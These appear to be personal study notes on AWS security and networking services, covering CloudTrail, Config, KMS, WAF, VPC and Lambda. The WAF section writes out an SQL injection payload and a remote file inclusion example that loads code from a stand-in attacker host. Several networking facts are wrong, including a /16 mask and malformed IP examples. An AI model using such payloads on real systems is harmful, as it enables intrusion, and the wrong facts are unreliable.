+ Enables governance, compliance and ops and risk auditing of your aws acc.
+ When you create your aws acc, by default cloud trail is enabled.
+ Gets or store history of events made from within your aws acc (console, SDK, CLI, AWS services).
+ Logs and data from cloudtrail can be send into cloud watch or s3 buckets.
+ By default, it is applied to all regions but can be set to s pecific region.
+ First service to start investigation to find out what happened to your aws acc.
+ It is a regional service.


**Importance of Cloud Trail for security $ Compliance**
1. **Visibility & Accountability**: Provides detailed logs of all API calls made in your AWS acc, helping you understand user activity and service usage. It allows for accountability by identifying who performed specific actions.
2. **It is good for securoty Monitoring and Incident response**: Cloud trail has helped in providing detailed logs of all API calls where you can detect unauthorized access or unusual behaviours in your aws environment. Security teams can respond quickly to potential secuirty incidents by investigationg the logs.
3. **Compliance and Audit Trails**: Mant regulatory standards (like SOC, HIPAA, PCI-DSS and GDPR) require maintaining audit trails of all access and modifications to sensitive data. Cloud trail assists in compliance by providing a reliable log of changes made to AWS resources, supporting audits and investigations.
4. **You can intergrate with other AWS security tolls/servicies**; Can be intergrated with services in AWS like labda functions, cloudwatch and many more to automate responses to certain activities enhancing security and operational excellence or efficiency.


## Cloud Trail Events
1. **Management Events**:  These are events (activities) related to mgt of AWS resources such as creating, deleting or modifying these resources such as creatiing an ec2 instance or modifying an S3 bucket, deleting an ec2 security groups (These actions are performed on your aws resources).
+ By default, your aws acc will capture and log (save) trails for all mgt events.
+ You have `read` and `write` events (read events will show who accessed the resources but did not edit or modify or edit the resource) while the write event simply is creating or deleting or modifying the resources. You can seperate read events from write events.
2. **Data Events**: These events are related to interaction with data within AWS servcies. for example they are more granular and include activities like reading and writing data in an s3 bucket or invoking a lambda function.
+ By default, data events are not captured or logged. Thses are high volume operations such as an s3 bucket object level activities like put, delete, get objects are some of the events data events can capture or log.
+ You can seperate read and write events just like management events.
+ You can track events or data for specific resources e.g s3 buckets.


**Features of CloudTrail**
- Dashboard
- Event History
- Insights
- Lake (Dashboards, Query, Event datastores and intergrations)
- Trails

**Cloud Trail Insights**: Uses ML to detect unusual activities in your acc activity. It automatically identifies potential or unsual activities and create an event for you to investigate e.g; Detect unusual spike or increase in API calls or volumes. It is not enabled by default and cost extra.
**Network Activity Events**: Provides information about resource operations performed on a resource within a virtual private cloud endpoint.

**Differences between CloudTrail and CloudWatch**
CT tracks API calls and activity in AWS acc while CW monitors AWS resources and apps
CT logs API activity(event history) while CW tracks metrics, logs and alarms
CT provides insight into user activity and resources changes while CW provides real-time monitoring and alerting
CT stores logs in S3 buckets while CW stores metrics in CW and logs in CW
CT captures mgt events, data events and insight events while CW records network events, custom metrics and CW logs
CT log retention is based on S3 buckets while CW is configurable to other services.

# AWS CONFIG
AWS Config provides a detailed view of the resources associated with your AWS account, including how they are configured, how they are related to one another, and how the configurations and their relationships have changed over time.

**Main Functionality**
+ *Resource configuration*: Captures and record the state of your resources and record changes over time, providing you with the complete history of how the resources has changed over time.
+ *Configuration Rules*: Create rules to evaluate (check) the configuration of your resources against predetermined standards.

**Importance of AWS config for Security Compliance**
+ Provides visibility into the current and historical configurations of AWS resources
+ Can be intergreated with other AWS services like SNS, Lamnda functions and aws security hubs to auto mate responses to compliance violation and enhances security.
+ It has snapshot and history: AWS config provides snapshots of resource configurations, enabling you to see how configurations have changed over time allowing you to be able to rollbac to previous versions.

**AWS Confi Terms**
`Resource Recording`: Records all changes made on configuration or resources and tracks them.
`Configuration Items`: Each recorded configuration is known as a `cofiguration item`. AWS config stores and tracks changes made to them
`Compliance Dashboard`: Enables adherence to standards and measures for compliance
`Notification & Remediation`: Cab be intergrated with other aws services like SNS to notify changges or lambda functions to take actions when certain events occur.
`Historic View of all changes`: Tracks and keeps a historical data of all configuration changes.

**Config Rules**
This is a feature in aws that helps to evaluate existing resources if they follow best standard practice

**Types of Config rules**
`AWS Managed rules`: Thses are pre-defined rules that comes with aws config which covers compliance and governing scenarios
`Custom Rules`: Designed by the user to fit specific cases and ifferent settings.

#### How does config Rules work
+ Evaluation: Continiously check your resources against the defined rule.
+ Compliance: You can see the report for compliant and non-compliant resource.
+ Triggered Action: It can trigger actions via SNS if a resource becomes non-compliant.

**NOTE**: AWS config rules does not prevent the action from happening. It has no deny option.


## SECURITY

**Security Frameworks**
1. **AWS well architectured framework - security pillar**: A security framework is a set of rules or guidelines for security best practices. In aws, we have the aws well architectured framework - security which focuses on: 
+ Identity & Access mgt (least privillege access)
+ Detective controls how to implement monitoring and logging.
+ Infrastructure Protection
+ Data Protection
+ Incident response
+ Compliance and Governance
- Another aws security framework is `AWS shared responsisbility model.`
- CIS AWS Foundations Benchmark.
**Other Security Framworks**
- NIST , SOC, PIC-DSS, HIPAA, GDPR

2. **Shift Left**: This is a concept of ensuring security is incorporated in the SDLC at the early stages to detect any vulnerabilities or security concerns rather than waiting into later stages in the SDLC. That is ehyas devops, we implement CI/CD pipelines to build, test and deploy our apps.

3. **Shift Right**: This is a concept ensuring that there is security when the apps is at the production level such as monitoring and logging.

## Encryption
This is converting information or data or plain text into a secret code or cipher text that hides the information or data from unauthorized users.
**Why is it important**
- Privacy and Confidentiality
- Data Intergrity
- Authentication
- Compliance and Regulations


# KMS - KEY MANAGEMENT SERVICE:
This is a service in AWS  that provides ways of creating and managing your encryption keys. It helps you to manage cryptographic keys securely. You can create your own keys and aws also has it's own managed keys. `Data at rest`
 The 2 types of KMS are:

`AWS Managed Keys`: These are keys created and managed by AWS on your behalf. Thus can be created by aws on your behalf as a result of a resource that you created that needed this key. AWS rotates the keys on your behalf for securoty best practices. There is no charge for using this key.
`Customer Managed Keys`: These are keys created and managed by the the user or any one within the aws acc. The responsisbility of rotating the keys lies with the user.
Suitable for more granular control like who can access them, what resources can access the keys, when the keys should be rotated and when they should be deleted or disabled. `It is $1/month per key`.

**Types of Encryption Keys**
There are 2 different types of encryption keys you can create in KMS
1. **Symetric Keys**
    - This is a single key you would create and this key is used for encryption of your data and decryption of your data.
    - It is faster but requires secure distribution of the key to all parties involved.
    - Common algorithms: AES (Advancec Encryption Standard), DES (Data Encryption Standard), Blowfisg and 3DES.
    `Common Use Cases`: Common  Data encryption, File and DIsk encryption such as EBS, AMI.
2. **Asymetric Keys**
    - Uses a pair of keys: A public key for encryption and a private key for decryption.
    - The public key can be exposed for shared openly while the private key must remain confidential.
    - Common Algorithms: RSA, Elliptic Curve Cryptography (ECC) and Diffie-Hellman.
    `Common Use Cases`: Secure Commuinication, Digital Signatures, Encryption and Authentication.

Other Encryption methods not used by KMS include:
**Hashing**: Hashing is a one way encryption technique used to verify data intergrity.


**AWS Key Management Service (KMS)**
Managed service that makes it easy for you to create and manage keys and control the use of encryption across a wide range of AWS services. KMS is a secure and resilient service that uses FIPS 140-3 validated hardware security modules to isolate and protect your keys.

**How it works**
AWS KMS helps you centrally manage and securely store your keys. You can generate keys in AWS KMS or import them from your own key management infrastructure. You can submit data directly to AWS KMS to be encrypted, or decrypted. Other AWS services can use your keys on your behalf to protect data encryption keys that they use to protect your data.

Your keys never leave AWS KMS and you are always in control of your keys. You can set usage policies that determine which users can use your keys and what actions they can perform. All requests to use these keys are logged in AWS CloudTrail so that you can track who used which key, how and when.

**Benefits and features**
    ***Fully managed***
    You can focus on your use of encryption while AWS handles durability, physical security, and policy enforcement to ensure that your keys are always available and safe.
    ***Centralized key management***
    KMS presents a single control point to manage keys and define policies consistently across integrated AWS services and your own applications.
    ***Integrated with AWS services***
    KMS is integrated with all major AWS services to simplify the use of encryption and to protect stored data through a common set of tools for controlling access.
    ***Encryption for all your applications***
    KMS is integrated with the AWS Encryption SDK to help you build encryption and key management into your own applications.
    ***Built-in auditing***
    KMS is integrated with AWS CloudTrail to provide a consolidated record of all key management activities and any attempt to use your keys.
    ***No commitment***
    There is no commitment and no upfront charges. You only pay for the keys that you create and when you use them.
    ***Secure***
    KMS uses FIPS 140-3 validated hardware security modules to generate and store your keys. Your keys can only be used inside these devices and can never leave them.
    ***Compliance***
    The security and quality controls in AWS KMS have been certified by multiple compliance schemes to simplify your own compliance obligations.
    ***Reliable***
    KMS uses highly durable storage and a resilient architecture to ensure that your keys are always available and are never lost.


**Certificate Manager** `Encrpty data in transit`
This is a service that helps you easily create, manage, deploy SSL/TLS certificates for use within aws services.

**SSL (Secure sockets Layer)**: SSL was developed by netscape in the mid 1990's for secure internet connections.
+ SSL establishes encrypted links between the the web server and the browser (remember a server is a computer and a browser is an application) making sure that all data between them remains private and integral.

**TLS (Transport Layer Security**): Created in 1999 and just like the SSL , it provides encrypted conections for data to be transferred over networks

**Types of ACM Certitificates**:`Public and Private`
`Private Certificates`: are used by an Org's own Certificate Authority(CA).
`Public Certificate`: Also known as a public certificate is a digital certificate that verifies the ownership of public keys by the named subject in the certificate.
It acts as an identity card for a website or app, proving that the owner of the domain is authentic and trusted.
It is issued by `Certificate Authority`.
Because these CA's are pre-trusted in OS and browsers, any website can load and verify them automatically.

Apart from ACM, you can get third party certificates from: `Let's Encrypt, ZeroSSL, Cloudfare. Firebase, Bitami`


**AWS System Manager --- Parameter Store**
Parameter is one of the features under AWS System manager
This service helps you with hierachy storage for configuration data mgt and secrets mgt. You can store sdata such as passwords, datbase strings, AMI and it has version control.
It is part of the AWS System Manager (SSM) and it allows you to store, retirve and manage parameters safely without hard coding them intp your apps or scripts.

**Key Features**
- Secure Storage
- Supports Paramters (A parameter is a value that can change the behaviour of an app or service)
- Supports Versioning
- Has Access control
- Easy to intergrate with other aws service
- Supports Hierachical storage

**Tiers of Parameter stores**
    ***Standard Tier***
    - Can save up to 10,000 standard parameters values up to 4kb
    - Supports parameter policies
    - add paramter policies and share with other aws acc.
    ***Advanced Tier***
    - Can save up to 100,000 standard parameters 
    - Store up tp 8kb
    - add paramter policies and share with other aws acc at an extra costs.

**Parameter policy**
A parameter policy is a rule or behaviour that can help you define the life cycle policy of your parameters. It helps you to automate tasks such as paramters expiration. This will expire your parameter at a given period, version clean up to save space, notifications, send alerts and events when a parameter is about to expire or has not been updated in a while.


**Types of Parameter Policy**
***Expiration Policies (12 months) retention***
***Expiration Notification Policies***
***No Change Notifications***

Parameter will store 3 different types of parameters e.g Data Types
1. String: simple string value
2. StringList: comma-seperated list of strings
3. Secure String: Encrypted values using AWS KMS.



**Secret Manager**
AWS secret manager is a fully managed service provided by Amazon Web Services (AWS) designed to help you securely store, manage and retrieve sensitive information such as credentials , API keys and other secrets.

Secrets can be `Standalone or Multi regional`
`Use Cases`: Database Credentials, API keys, App configs, IAM user Credentials

**Benefits**
- Centralized Mgt of all secrets.
- Enhances Auditing and Monitoring.
- Supports Env specific secrets
- Compliance and best practices.


AWS Secrets Manager helps you protect access to your applications, services, and IT resources. You can easily rotate, manage, and retrieve database credentials, API keys, and other secrets throughout their lifecycle.

**How it works**
Use Secrets Manager to store, rotate, monitor, and control access to secrets such as database credentials, API keys, and OAuth tokens. Enable secret rotation using built-in integration for MySQL, PostgreSQL, and Amazon Aurora on Amazon RDS. You can also turn on rotation for other secrets using AWS Lambda functions. To retrieve secrets, you simply replace hardcoded secrets in applications with a call to Secrets Manager APIs, eliminating the need to expose plaintext secrets.
 
**Benefits and features**
***Rotate secrets safely***: Easily rotate secrets and enable users and applications to retrieve the most recent secret without a code deployment.
***Manager access with fine-grained permissions***: Control access to secrets using fine-grained permissions with AWS Identity and Access Management policies.
***Secure and audit secrets centrally***: Audit and monitor secrets easily using AWS logging and monitoring services such as AWS CloudTrail and Amazon CloudWatch.
***Pay as you go***: Pay for the secrets you store in Secrets Manager and for the use of these secrets.


# Web Application Firewall (WAFs)
This is a service in AWS that helps to protect web application from common web expolits and attacks that could affect your apps availability, compromise security, or consume excessive resources. It operates at Layer 7
+ A web app firewall is a security solutuin designed to `monitor, filter and protect web application` by analyzing and controlling HTTP/HTTPS traffic
+ Layer 7 is http
+ This is a global service but upon creation, the user must specify which regions the WAF should operate in.

**Main Purpose**: Protects our web apps from common attacks or web exploits like:
    ***SQL Injection***: SQL Injection is a security attack where a hacker tricks your application into running malicious SQL code by inserting it into an input field (like a login box or search bar).
        ***How does SQL Injection work?***: 
            - If your app builds SQL queries like this: `SELECT * FROM users WHERE username = '$input';`
            - and the attacker types this into the username box: `' OR 1=1 -- `
            - The query becomes:SELECT * FROM users WHERE username = ' OR 1=1 --; OR 1=1 is always true` -- comments out the rest
            - This makes the database return all users, log someone in without a password, or worse — allow deletion of data.
    ***Cross site Scripting***: Attackers inject malicious JavaScript into a website so it runs in other users’ browsers.
    `Example`: 
        A comment box allows `script> tags.
        Attacker posts a script that steals other users’ cookies.
    `Impact`: Stolen sessions, fake pages, malicious pop-ups.

    ***Cross Site Request Forgery***: Tricks a logged-in user into performing an action they didn’t intend, like sending money or changing a password.
    Example: You’re logged into your bank.
        You visit a malicious site.
        That site secretly triggers a valid request using your login session.
    Impact: Unauthorized actions performed as the real user.

    ***Remote File Inclusions***: Website loads a file from a URL given by the attacker, allowing them to run their own code on the server.
    `Example`: 
        include($_GET["page"]);
        Attacker sets: page=http://evil.com/malware.php
    Impact: Full server compromise, malware execution.

    ***Distributed Denial of Service (DDOS)***: Millions of devices flood a server with traffic until it becomes slow or crashes.
    Example:
        Bots send huge amounts of requests.
        Server can't keep up → goes offline.
    Impact: Website or service becomes unavailable.

You can intergrate WAFs with various AWS services such as: `ALB, API Gateway, Cloudfront, Amazon Cognito User Pool, AWS Verified Access, AWS appsync GraphQL API`

**Web Application Firewall Rules**: These are simply specific rules the user sets from the Web App Firewall to monitor and  take action against. 

**Hands On Creating WAF**
    1. Sign into your AWS Console and search for the WAF service --> WAF & Shield in the AWS search bar.
    2. Check Pricing and ensure it is in oyur budget.
    3. Choose App Catergory, choose the App focus (API and Web, Web ...) and select the resource you want to create a protection pack for.


**AWS Shield - Managed DDoS protection service.**
AWS Shield provides continuous attack detection and automatic mitigations. AWS Shield offers two tiers of protection - Standard and Advanced.
    **Benefits and Features**
    - Access to AWS Shield Response Team
    - Visibility
    - Cost protection
    - Customizable protection

**AWS Firewall Manager - Centralized security management**
Centrally configure and manage firewall rules across accounts and applications.
    **Benefits and Features**
    - Simplify management of firewall rules across your accounts
    - Easily deploy managed rules across accounts
    - Ensure compliance of existing and new applications
    - Enable rapid response to internet attacks

**Amazon GuardDuty - Intelligent threat protection for accounts and workloads** 
Single-step threat detection
Designed to reduce security risk by using continuous intelligent threat detection capabilities for your AWS accounts, containers, workloads, and data.
Free 30 days free trial for new accounts.
    **Benefits and Features**
    - Malware Protection for S3
    - Accurate machine learning detection
    - Tightly integrated for fast response
    - Easy to deploy and scale
    - Up-to-date threat intelligence protection
    **Use Cases**
    - Protect your compute workloads
    - Protect your data stored in Amazon S3 buckets
    - Protect your AWS credentials

**Amazon Inspector - automated and continual vulnerability management at scale**
Amazon Inspector is an automated vulnerability management service that continually scans workloads(EC2 instances, Lambda Functions, more) for software vulnerabilities and unintended network exposure. 15 days trial for new accounts.
Can be assigned a delegated Admin if multiple accounts are involved. 
    **Benefits and features** 
    - Automated discovery and continual scanning: Automatically discover workloads and continually scan them for vulnerabilities across your organization.
    - Highly contextualized risk score for prioritization: Drive efficiency and accuracy with the Amazon Inspector risk score for prioritized, contextualized, and actionable results.
    - Single pane of glass for all vulnerabilities: Consolidate Amazon EC2 and container vulnerability management with a fully managed and highly scalable service.
    - Automate vulnerability management workflows: 
    Reduce mean time to resolve (MTTR) vulnerabilities with automation by integrating with Amazon EventBridge and AWS Security Hub CSPM.


**Amazon Macie - Discover and protect your sensitive data at scale**
Amazon Macie is a data security service that discovers sensitive data using machine learning and pattern matching, provides visibility into data security risks, and enables automated protection against those risks.
    **Benefits and features**
    - Ongoing evaluation of your Amazon S3 security posture.
    - Fully managed sensitive data types
    - Automated sensitive data discovery
    - Discover proprietary or unique data types
    - Detailed and actionable security and sensitive data discovery findings
    - Securely review and validate sensitive data found in an Amazon S3 object
    - Create and manage allow lists to specify text or text patterns
    - One-click deployment with no upfront data source integration
    - Multi-account support and integration with AWS Organizations
    **Use Cases**
    - Continually strengthen your data security posture
    - Discover sensitive data for compliance
    - Detect and protect sensitive data during migration to AWS
    - Increase visibility into where your most business-critical data exist in Amazon S3.
    - Assessing your data privacy and security.



# NETWORKING
## VPC - Virtual Private Cloud
**What is a VPC**: A VPC is an isolated portion of the AWS Cloud populated by AWS objects, such as Amazon EC2 instances.
**Isolation**: 
**Subnets**: A subnet is a range of IP addresses in your VPC. After creating a VPC, you can add one or more subnets in each Availability Zone. Can be public or private
Route tables: A route table contains a set of rules, called routes, that are used to determine where network traffic from your subnet or gateway is directed.
**Internet Gateways**:An internet gateway is a horizontally scaled, redundant, and highly available VPC component that enables communication between your VPC and the internet.
To use an internet gateway, attach it to your VPC and specify it as a target in your subnet route table for internet-routable IPv4 or IPv6 traffic. An internet gateway performs network address translation (NAT) for instances that have been assigned public IPv4 addresses.
**NAT gateways**:You can use a network address translation (NAT) gateway to enable instances in a private subnet to connect to services outside your VPC but prevent such external services from initiating a connection with those instances. There are two types of NAT gateways: public and private.
    A ***public NAT gateway*** enables instances in private subnets to connect to the internet but prevents them from receiving unsolicited inbound connections from the internet. You should associate an elastic IP address with a public NAT gateway and attach an internet gateway to the VPC containing it.
    A ***private NAT gateway*** enables instances in private subnets to connect to other VPCs or your on-premises network but prevents any unsolicited inbound connections from outside your VPC. You can route traffic from the NAT gateway through a transit gateway or a virtual private gateway.


**What to keep in mind when creating a VPC**
+ Identify requirements: determine the number of subnets needed, host (resources that will use the network), anticipate for future growth.
+ Ensure when creating multiple VPC's. Each VPC should have unique IP's to avoid network overlaps
+ High Availability.
+ Logging and Monitoring

**Definitions of Key Terms**
We need to determine the host range (this is simply the number of IP addresses the host need to share resources within the network).
`Bits`
Bit(Binary Digits): These are fundamental units of data or basic data in computing or networking. This is a contraction of "binary digits" they are the smallest piece if information a computer can handle. It is simply building blocks of data, represented as `0's` and `1's`.
Bits are used in binary code, which is the language that computers use to process dtata. Multiple bits are combined to represent complex information.

`What is an IPv4`: Internet Protocol Version 4 is the fourth version of the Internet Protocol, which is used to identify devices on a network using an address.
An IPV4 address consists of `32 bits` divided into 4 groups (called `octets`) seperated by dots. for example: 192.168.111.029 or 10.0.44.4
Each octet can have a value from 0 to 255, meaning that an IPV4 address can represent approximately 4.3 billion unique addresses.

`What is an IPv6`: Internet Protocol Version 6 is the sixth version of the Internet . It is the successor of IPV4, designed to address the limitation of IPv4 addresses.

+ An IPv6 address consists of 128 bits, written in eight groups of four hexadecimals digits seperated by colons. For example: `2001:0dc8:94fh:0000:0000:8dh3f:93d9:7333`
+ This means IPv6 can support almost a limitless number of unique addresses (over 340 decillion addresses).

`What is a CIDR`: CIDR (Classless Inter-Domain Routing) is a method for allocating IP addresses and IP routing. It uses a CIDR notation to specify IP address ranges.
+ A CIDR block is written as an IP address followed by a slash and a number (e.g `210.111.1.0/24`).
The number indicates how many bits are used for the network portion of the address.

**How can we calculate the cidr range for our VPC & Subnets**
A VPC needs the cidr range and each subnet in the VPC will also need a cidr range.

1. `Understanding the network structure`
An IP address is split into 2 parts: `network part & host part`
`Network part`: Identifies specific network(Network part of the router of your Wi-Fi) while the `host part` identifies individual devices within the network e.g your home devices like ipads, laptops, tv and mobile devices.

2. Subnet Mask: A subnet mask will tell us how many bits we want to use for the network e.g if you have a 
    /24 this means the first 24 bits are the network part (255.255.255.0) in decimal
    /16 this means the first 16 bits are the network part (255.255.255.0) in decimal

Usable IP: = 2 32-cidr

CIDR: 148.456.485/24   our IPv4 comes with 32 bits
      32 bits - 24 bits = 8
      2 ^ 8: 256

Public IP address: Ip addreses that allows your devices to commuinicate with the public network.
Private IP address: Ip addresses used for commuinication within the private network. Resources within your private network commuinicates within each other using the orivate IP.

**Advantages of creating a Custom VPC**
+ Custom VPC allows for network speration or segementation (public + private subnets) while aws places your resources in the default public VPC.
+ Custome VPC's Shave more Security control (sec groups, ACL and secure routes) while AWS by default configure your routing policies and acl
+ Custom VPC's allow for control over IP ranges, network size and IP overlaps while with default VPC's there is no control.
+ Custom VPC's allow for multiple subnets while default VPC have no control over the number of subnets being created.
+ With custom VPC's, you will have full control over routables whereas default VPC's used the default routes
+ Custom VPC's are costly unlike the default VPC's which is free.

## Building a custom VPC from scratch
+ VPC (select cidr range network size)
+ Subnets (cidr range subnets network size)
+ NAT Gateway
+ Set up Internet Gateway and attached to VPC so our VPC can have internet traffic.
+ Create Routables.


# Missing some notes

**VPC Peering**
VPC peering connection is a networking connection between two VPCs that enables you to route traffic between them privately. Instances in either VPC can communicate with each other as if they are within the same network. You can create a VPC peering connection between your own VPCs, with a VPC in another AWS account, or with a VPC in a different AWS Region.
AWS uses the existing infrastructure of a VPC to create a VPC peering connection; it is neither a gateway nor an AWS Site-to-Site VPN connection, and does not rely on a separate piece of physical hardware. There is no single point of failure for communication or a bandwidth bottleneck.

# Types of peering: Same region, Cross region and cross account peering of VPC.

# VPC Endpoint: 
A VPC endpoint enables connections between a virtual private cloud (VPC) and supported services(such as S3, DynamoDb, SNS, SQS, Secrets Manager and more), without requiring that you use an internet gateway, NAT device, VPN connection, or AWS Direct Connect connection. Therefore, your VPC is not exposed to the public internet.
**Types of VPC endpoints**
1. ***Interface Endpoint***: Allows you to connect to AWS services like ES2, S3, Dynamo DB and many other services
    - These are VPC interfaces that are created in your VPC with private IP Addresses.
    - It creates and ENI(Elastic Network Interface) inside your subnets.
    - The traffic between your VPC and the service stays between the amazon network
    - This endpoint supports aws managed and customer policies
    - AWS Charges per hour for endpoint and per GB for data processing.
2. ***Gateway Endpoint***: Used to connect to S3 nad Dynamo DB
    - This is an entry point for traffic within a VPC that leads these services.
    - Routables are modified automatically by aws to ensure traffic to these services are directed to the endpoint.
    - It only supports or avaialble to Amazon S3 nad Dynamo db
    - Free to use

**Benefits of using VPC Endpoints**
- Improves Security: prevents traffic from going through the public internet
- Reduces Latency since resources are already eithin a private aws network, unlike going throug the public
- Cost effective


# VPC Flow Logs
Captures infor about the IP traffic going to and fro from network interfaces in yout VPC
Provides valuable and good insights into network pattern, security analysis and troubleshooting and compliance.
- Captures inbound and outbound traffic in the VPC and subnets
- Can capture subnet flow logs and also Elastic Network Interfaces (ENI)




# SERVELESS Technology 
This is a service that allows users (developers, devops and cloud) to build apps and run apps without having to manage the underlying architecture. AWs will handle the task of provisioning, scalling and maintanance, while enabling users to focus on solely writing the code for their app or service.
Serveless simply meanss -> you don't manage the servers

**Key Services in AWS that uses a serveless technology**
- AWS Labmda (functions).
- Amazon API gateway (Serveless API)
- AWS Fargate
- Amazon Step functions
- Amazon Eventbridge
- AWS AppSync
- SNS & SQS
- Kinesis (Amazon data firehose, Kinesus Data Stream, Kinesis Analytics)

## AWS Lambda : lets you run code without thinking about servers.
AWS Lamda is a serveless compute service that allows you to run code in response to events wihtout provisioning or managing servcers. It automatically scales apps by running code in response to each trigger or event and manage the compute resources required to run the code.

**Commom Use Cases Include**
- Task Automation
- File Processing
- Real time data processing

**AWS Landa supports the following languages**: Python, Node.js, Java, C#, Golang etc

**Some AWS services that can be intergrated with lambda Functions**

**Limitations of Lambda functions**
1. **Execution Limits**
    + The max timeout for a lamda function is 15 mins. For tasks requiring longer processing, you'll need an alternative solution like `Step Functions` or `EC2 instances`.
    + Memory can range between 128 MB and 10, 240 MB. CPU power is proportional to the memory allocated, so heavy computational tasks may require alterbative setups
    + When it comes to disk usage, Lambda provides 512 MB to 10 GB of ephemeral storage.
    + You can setup environmental variables up to (4KB)
2. **Deployment Limits**
    + Lambda has a deployment size (compressed zip): 50 MB of code uploaded directly using the AWS mgt console. terraform or cloudformation
    + Size of uncompressed deployment (code + dependencies): 250 MB when uploading through an S3 bucket.
    + Layer size. Each lambda layer has a limit of 50MB and a function can use up to 5 layers. A layer is simply a code block that you can upload or add to a lambda function.
3. **Service Limits**
    + Executions can take place at the same time up to 1000 lamdas (but this can be increased per region.)
    + Burst concurrency meaning it has a initial burst limit of up to 500 invocations per minute in most aws regions, note in some regions like North Virginia, there are high burst limits which can have high burst limits up to 3000 invocations per minute.
4. **Debugging**    
    + It can be difficult to debug lamda functions due to limited access to the underlying architecture.

`Interview Question`: If you have a Lamda function that exceeds the deployment package size limits (50 MB for a zipped package and 250 MB for an unzipped package).
`Answer`: 
1. **We can use Lamda Layers**
What are layers ?: Lamda layers
2. **We can use Amazon S3 for large files**: Instead of packaging large assests or binaries within the Lamda functions deployment package, store them in an S3 bucket which can be retrieved at run time
3. **Use AWS Elastic File system (EFS)**: AWS supports scalabel and large files systems that can be mounted on to lamda functions.
4. **Use Container Images**: AWS Labda support deploying functions as container images of traditional zipped packages. The container image can be up to 10GB, allowing significantly larger deployment.
5. **Split Functionality**: Break down the Lamda functions (Put the code into modules, split the code into small and mageable pieces and each piece is a sperate Lambda function  and you can use a step function to execute multiple lambda functions)


**Core Concepts of Lambda Functions**
1. *FaaS - Function As A Service*: Function as a Service (Faas) is a cloud computing model that allows developers to execute code is response to specific events without provisioning or manageing the servers. AWS Lambda is a leading example of FaaS.

AWS Lamda functions are built with specific componets:
2. **Anatomy of a Lambda**
The main components of a Lambda function are:
    `Handler (Entry Point)`: This is the entry point for our function, a method in our code that processes the invocation event. Think of it as the "main" function of our Lambda code.
        Python: lambda_function.lambda_handler(event, context)
    `Event`: This is the JSON-formatted input data that triggers the function's execution. It carries information about what initiated the function call.
    `Context`: This is an object containing runtime information about the function's execution environment. It includes details like function name, version, memory limits, request ID, and remaining execution time.
    `Environment variables`: These are key-value pairs that you can set to configure your Lambda function's behavior without modifying the code itself. They are often used to store API keys, database credentials, or other settings.
   

3. **What languages does Lambda support?**
Lambda natively supports Node.js, Python, Ruby, Java, Go, C#, and PowerShell. This means we can write our Lambda functions directly in these languages without additional setup.
Additionally, Lambda allows us to use custom runtimes, providing the flexibility to package our function code and dependencies in a container image. This enables support for virtually any programming language, allowing us to choose the tool that best suits our needs.

4. **To Improve the performance of lambda functions up to 10x Java**
When you invokde(request it to run by an event) a Lambda function uses Java Init ---> Invoke ---> shutdown
Enable `snapstart`, when enable, there is no initialized step, it is already pre-installed: ----> Invoke ----> shutdown

5. **What is an event source mapping?**
An event source mapping is a Lambda resource that reads items from an event source and invokes a function.
We can use event source mappings to process items from Amazon DynamoDB streams, Amazon Kinesis streams, Amazon MQ queues, self-managed Apache Kafka, Amazon SQS queues, and more.
Lambda provides a polling mechanism to read batches of records from the event sources and invoke a function.

6. **Layers**
Lambda layers are a dsitribution mechanism for libraries, custom runtime components and other dependencies that you can include in your Lambda function. They allow you to package and share common 

**AWS Step Functions** 
AWS Step Functions makes it easy to coordinate the components of distributed applications and microservices using visual workflows.
**API Gateway**: Amazon API Gateway is a fully managed service that makes it easy for developers to create, publish, maintain, monitor, and secure APIs at any scale.

7. **How to create a Lambda function?**
There are several ways to create Lambda functions:
Method              |     Description                                      |   Best Suited for
----------------------------------------------------------------------------------------------------------------------
Lambda Console      |  Write code directly in the browser's editor.      | Simple functions, quick testing
----------------------------------------------------------------------------------------------------------------------
Deployment Package  |  Package code and dependencies into a ZIP archive  | Larger projects, complex functions
                    |  upload.                                           |
----------------------------------------------------------------------------------------------------------------------
Container Image     |   Package function as a Docker container image.    | Custom runtimes, specific configurations
----------------------------------------------------------------------------------------------------------------------
Infrastructure      |  Define functions and resources in                 |
-as-Code            |  code using AWS SAM, CloudFormation, or CDK.       | Managing complex serverless applications,  
                    |                                                    | automation
-----------------------------------------------------------------------------------------------------------------------

Note: By default, lambda functions comes with a 3 seconds execution time.
